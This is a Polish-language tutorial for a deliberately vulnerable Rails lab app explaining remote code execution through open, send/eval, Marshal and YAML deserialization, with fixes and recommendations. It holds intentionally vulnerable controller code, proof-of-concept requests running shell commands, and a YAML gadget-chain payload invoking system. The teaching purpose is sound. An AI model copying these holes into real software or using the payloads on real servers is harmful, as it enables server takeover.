# Remote Code Execution (RCE)

Źródło: https://bishopfox.com/blog/ruby-vulnerabilities-exploits

---

Uruchomienie przykładowej aplikacji dla tej podatności:

```bash
# Aby uruchomić aplikację, wykonaj następującą komendę:
docker compose up -d

# Zatrzymanie aplikacji odbywa się za pomocą:
docker compose down

# W celu rozpoczęcia pracy od nowa (usunięcia wszystkich danych) użyj:
docker compose restart
```

## Opis

Zdalne wykonanie kodu (Remote Code Execution, RCE) to jedna z najpoważniejszych podatności w aplikacjach webowych, która umożliwia atakującym uruchamianie dowolnego kodu na serwerze aplikacji.

W kontekście Ruby on Rails, RCE może wynikać z nieodpowiedniego przetwarzania danych wejściowych użytkownika, zwłaszcza w przypadkach użycia funkcji takich jak `open`, `send`, `eval`, `instance_eval`, a także w wyniku niebezpiecznej deserializacji obiektów.

Ruby jest językiem o dużej elastyczności, co sprawia, że podatności na RCE mogą pojawiać się w wielu miejscach, szczególnie gdy aplikacja nie stosuje odpowiednich zabezpieczeń przed wstrzyknięciem złośliwego kodu. Wyróżnić można kilka typowych przypadków podatności:
- **Niebezpieczne użycie** `open` – funkcja ta może interpretować niektóre wartości jako polecenia systemowe, jeśli wejście użytkownika nie jest walidowane.
- **Niebezpieczne użycie** `send` i `public_send` – umożliwiają wywołanie metody na obiekcie na podstawie nazwy podanej przez użytkownika.
- **Niebezpieczna deserializacja** (`Marshal`, `YAML`, `JSON`) – pozwala na załadowanie i wykonanie złośliwych obiektów, co może prowadzić do przejęcia kontroli nad aplikacją.

## Przykład

W celu zademonstrowania podatności na zdalne wykonanie kodu (RCE) w Ruby on Rails, przygotowano prostą aplikację internetową, która zawiera szereg niebezpiecznych mechanizmów przetwarzania danych wejściowych użytkownika.

Aplikacja składa się z kontrolera `ArticlesController`, który obsługuje różne zapytania HTTP i przetwarza przekazane parametry.

W kodzie aplikacji celowo pozostawiono podatne fragmenty, które pozwalają na wykonanie dowolnego kodu na serwerze, jeśli użytkownik dostarczy odpowiednio spreparowane dane wejściowe.

```ruby
class ArticlesController < ApplicationController
  skip_before_action :verify_authenticity_token

  def index
    @result_article = Article.new(param1: 'param1', param2: '')

    # RCE poprzez funkcję `open`
    if params[:url]
      @result_article.param1 = 'params[:url]'
      @result_article.param2 = open(params[:url])
    end

    # RCE poprzez `send`
    if params[:send_method_name] && params[:send_argument]
      @result_article.param1 = "#{params[:send_method_name]}, #{params[:send_argument]}"
      begin
        @result_article.param2 = @result_article.send(params[:send_method_name], params[:send_argument])
      rescue StandardError => e
        @result_article.param2 = e.message
      end
    end

    # RCE poprzez deserializację Marshal
    if params[:base64binary]
      @result_article.param1 = params[:base64binary]
      @result_article.param2 = Marshal.load(Base64.decode64(params[:base64binary]))
    end

    # RCE poprzez YAML deserializację
    return unless params[:yaml]

    @result_article.param2 = YAML.unsafe_load(params[:yaml])
  end
end
```

### RCE poprzez funkcję `open`

```ruby
if params[:url]
  @result_article.param1 = "params[:url]"
  @result_article.param2 = open(params[:url])
end
```

Funkcja `open` w Ruby może działać w dwóch trybach:
- Otwiera pliki lokalne (np. `open("/etc/passwd")`)
- Otwiera URL-e (np. `open("http://example.com")`)

Jednak istnieje trzecia możliwość:
- Jeśli wartość parametru zaczyna się od znaku `|`, Ruby interpretuje ją jako **polecenie systemowe**.

Jeżeli atakujący spróbuje wysłać przykładowo takie zapytanie HTTP:
```http
GET http://127.0.0.1:3000/?url=|date>>/tmp/rce1.txt
```

Na serwerze spowoduje to wykonanie komendy:
```bash
date >> /tmp/rce1.txt
```

W projekcie znajduje się plik `requests.http`, który zawiera przykładowe zapytania HTTP, które można wykonać za pomocą narzędzia do testowania API, np. wtyczki **REST Client** w **Visual Studio Code**.

Po wykonaniu tego zapytania, na serwerze zostanie utworzony plik `/tmp/rce1.txt` z datą i godziną wykonania komendy.

![RCE Open](./screenshots/rce-1.png)

Aby się zabezpieczyć, zamiast `open`, należy użyć zaufanej biblioteki do zapytań http np. wbudowanej `Net::HTTP` i sprawdzać, czy URL należy do dozwolonej domeny:

```ruby
require 'net/http'

url = URI.parse(params[:url])

if url.host == "trusted.com"
  response = Net::HTTP.get(url)
end
```

### RCE poprzez `send`

Metoda `send` pozwala na dynamiczne wywoływanie metod na obiekcie – także metod prywatnych i nieprzeznaczonych do bezpośredniego wywołania. Jeśli atakujący może określić jej nazwę, może wywołać dowolną metodę obiektu, np. `eval`.

```ruby
if params[:send_method_name] && params[:send_argument]
  @result_article.param1 = "#{params[:send_method_name]}, #{params[:send_argument]}"
  begin
    @result_article.param2 = @result_article.send(params[:send_method_name], params[:send_argument])
  rescue StandardError => e
    @result_article.param2 = e.message
  end
end
```

Jeżeli atakujący spróbuje wysłać przykładowo takie zapytanie HTTP:
```http
GET http://127.0.0.1:3000/?send_method_name=eval&send_argument=`date>>/tmp/rce2.txt`
```

Spowoduje to takie wywołanie metody na obiekcie, a umieszczenie w argumencie polecenia w backtickach pozwoli na wykonanie go jako polecenia systemowego:
```bash
@result_article.eval(`date>>/tmp/rce2.txt`)
```

Po wykonaniu tego zapytania, na serwerze zostanie utworzony plik `/tmp/rce2.txt` z datą i godziną wykonania komendy.

![RCE Send](./screenshots/rce-2.png)

Aby się zabezpieczyć, najlepiej unikać użycia `send` w aplikacji, a jeśli jest to konieczne, należy stosować listę dozwolonych wartości:

```ruby
allowed_methods = %w[title description]

if allowed_methods.include?(params[:send_method_name])
  @result_article.send(params[:send_method_name], params[:send_argument])
end
```

### RCE poprzez deserializację `Marshal`

`Marshal.load` bezpośrednio deserializuje dane wejściowe, a to oznacza, że złośliwe obiekty Ruby mogą zostać załadowane i wykonane.

```ruby
if params[:base64binary]
  @result_article.param1 = params[:base64binary]
  @result_article.param2 = Marshal.load(Base64.decode64(params[:base64binary]))
end
```

Atakujący może wysłać przygotowany wcześniej złośliwy obiekt zaszyfrowany w Base64, wykonujący zakodowaną w sobie komendę systemową. Na przykład:

```http
GET http://127.0.0.1:3000/?base64binary=... (payload)
```

Wywołanie w aplikacji powyższego zapytania nie spowoduje wykonania RCE ze względu na nową wersję Ruby `3.3.5`, ale podatność jest nadal obecna w starszych wersjach.

Aby się zabezpieczyć, zamiast `Marshal.load`, należy stosować bezpieczne formaty serializacji, takie jak JSON, z odpowiednim filtrowaniem dozwolonych typów danych.

```ruby
require 'json'

safe_data = JSON.parse(Base64.decode64(params[:base64binary]))
```

Wiele RCE w aplikacjach Ruby on Rails wynikało właśnie z niebezpiecznej deserializacji danych między innymi za pomocą `Marshal.load`. Przykładem takiej podatności jest **CVE-2020-8165**, która dotyczyła zapisywania i odczytywania danych z bazy danych Redis.

### RCE poprzez deserializację YAML

`YAML.unsafe_load` (oraz starsze `YAML.load`) pozwala na deserializację dowolnych obiektów Ruby, w tym takich, które mogą wywołać `system()`.

```ruby
if params[:yaml]
  @result_article.param2 = YAML.unsafe_load(params[:yaml])
end
```

Atakujący może wysłać przygotowany wcześniej złośliwy obiekt w formacie YAML, który po deserializacji spowoduje wykonanie złośliwej komendy systemowej. Na przykład:

```http
POST http://127.0.0.1:3000/
Content-Type: application/json

{
  "yaml": "--- !ruby/object:Gem::Requirement\nrequirements: !ruby/object:Gem::Package::TarReader\n  io: !ruby/object:Net::BufferedIO\n    io: !ruby/object:Gem::Package::TarReader::Entry\n      read: 0\n      header: aaa\n    debug_output: !ruby/object:Net::WriteAdapter\n      socket: !ruby/module 'Kernel'\n      method_id: :system\n  git_set: date >> /app/rce4.txt"
}
```

Wywołanie w aplikacji powyższego zapytania nie spowoduje wykonania RCE ze względu na nową wersję Ruby `3.3.5`, ale podatność jest nadal obecna w starszych wersjach.

Aby się zabezpieczyć, zamiast `YAML.unsafe_load`, należy stosować dla nowszych wersji `YAML.load` lub `YAML.safe_load`:

```ruby
safe_data = YAML.safe_load(params[:yaml], permitted_classes: [String, Array, Hash])
```

## Skutki

Podatność na zdalne wykonanie kodu jest jedną z najbardziej krytycznych luk w zabezpieczeniach aplikacji webowych. Może prowadzić do:
- **Przejęcia kontroli nad serwerem** – atakujący może uruchamiać dowolne polecenia systemowe.
- **Dostępu do poufnych danych** – np. kradzieży haseł, kluczy API, bazy danych.
- **Zainstalowania złośliwego oprogramowania** – np. backdoora lub ransomware.
- **Zniszczenia danych** – poprzez usunięcie lub modyfikację krytycznych plików.

## Zalecenia

Aby zapobiec atakom RCE, należy stosować następujące praktyki:
- **Walidacja i filtrowanie danych wejściowych** - Aplikacja nigdy nie powinna bezpośrednio wykonywać kodu na podstawie danych wejściowych od użytkownika. Wszystkie dane powinny być walidowane i filtrowane według ścisłych reguł.
- **Unikanie dynamicznego wykonywania kodu** (`eval`, `send`, `public_send`) - Należy unikać dynamicznych metod wykonujących kod Ruby na podstawie danych wejściowych użytkownika. Jeżeli ich użycie jest niezbędne, należy stosować białe listy dozwolonych wartości.
- **Ograniczenie dostępu do systemu operacyjnego** - Serwer aplikacyjny powinien działać na odizolowanym użytkowniku z minimalnymi uprawnieniami, aby nawet w przypadku ataku ograniczyć możliwości przejęcia kontroli nad systemem.
- **Bezpieczna deserializacja danych** - Należy unikać używania niezabezpieczonych metod deserializacji takich jak `Marshal.load`, `YAML.unsafe_load` i `Oj.load`. Preferowane jest stosowanie bezpiecznych formatów, takich jak JSON, z odpowiednim filtrowaniem dozwolonych typów danych.
- **Regularne aktualizowanie Ruby, Rails i zależności** - Wiele podatności w Ruby wynika z błędów w starszych wersjach języka i bibliotek. Utrzymywanie aktualnej wersji Ruby oraz Gemów może zapobiec wykorzystaniu znanych exploitów.
